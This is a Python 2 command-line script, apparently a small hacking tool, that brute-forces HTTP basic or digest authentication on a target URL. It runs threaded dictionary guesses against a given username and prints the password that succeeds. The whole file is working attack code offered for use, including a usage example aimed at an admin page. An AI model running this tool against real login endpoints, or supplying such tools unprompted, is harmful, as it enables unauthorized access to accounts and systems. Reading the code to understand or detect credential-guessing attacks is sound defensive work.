import requests
from threading import Thread
import sys
import time
import getopt
from termcolor import colored
from requests.auth import HTTPDigestAuth

global hit  # Flag to know when we have a valid password
hit = "1"


def banner():
    print "\n***************************************"
    print "* Basic password bruteforcer 1.0*"
    print "***************************************"


def usage():
    print "Usage:"
    print "\t-w: url (http://somesite.com/admin)"
    print "\t-u: username"
    print "\t-t: threads"
    print "\t-f: dictionary file"
    print "\t-m: method (basic or digest)\n"
    print "example: back2basic.py -w http://www.somesite.com/admin -u admin -t 5 -f pass.txt\n"


class request_performer(Thread):
    def __init__(self, name, user, url, method):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        self.method = method


    def run(self):
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    r = requests.get(self.url, auth=(self.username, self.password))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))

                if r.status_code == 200:
                    hit = "0"
                    print "[+] Password found - " + colored(self.password, 'green') + "  - !!!\r"
                    sys.exit()
                else:
                    print "Not valid " + self.password
                    i[0] = i[0] - 1  # Here we remove one thread from the counter
            except Exception, e:
                print e


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:t:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()
    method = "basic"
    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictio = arg
        elif opt == '-m':
            method = arg
        elif opt == '-t':
            threads = arg
    try:
        f = open(dictio, "r")
        name = f.readlines()
    except:
        print"Failed opening file: " + dictio + "\n"
        sys.exit()
    launcher_thread(name, threads, user, url, method)


def launcher_thread(names, th, username, url, method):
    global i
    i = []
    i.append(0)
    while len(names):
        if hit == "1":
            try:
                if i[0] < th:
                    n = names.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(n, username, url, method)
                    thread.start()

            except KeyboardInterrupt:
                print "Brute forcer interrupted  by user. Finishing attack.."
                sys.exit()
            thread.join()
        else:
            sys.exit()
    return


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print "Brute force interrupted by user, killing all threads..!!"
